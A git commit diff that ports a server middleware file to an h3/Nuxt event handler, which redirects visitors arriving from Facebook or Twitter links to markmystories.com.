a248a350a80927a10dafddbb512f31a07044caf2
finemflame <84194780+finemflame@users.noreply.github.com>
2023-05-14 21:25:26 +0200

    Update [...slug].ts

--- server/middleware/[...slug].ts
+++ server/middleware/[...slug].ts
@@ -1,12 +1,8 @@
- export default  (req, res, next) => {
-    console.log(req.url);
-    const headers = req.headers;
-    res.redirect("https://markmystories.com"+req.url);
+export default defineEventHandler((event) => {
+    const headers = event.req.headers;
+    
     if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
-        res.redirect("https://markmystories.com"+req.url);
-    } else {
-        next();
+        const redirectUrl = "https://markmystories.com" + event.req.url;
+        sendRedirect(event, redirectUrl);
     }
-};
-
-
+});
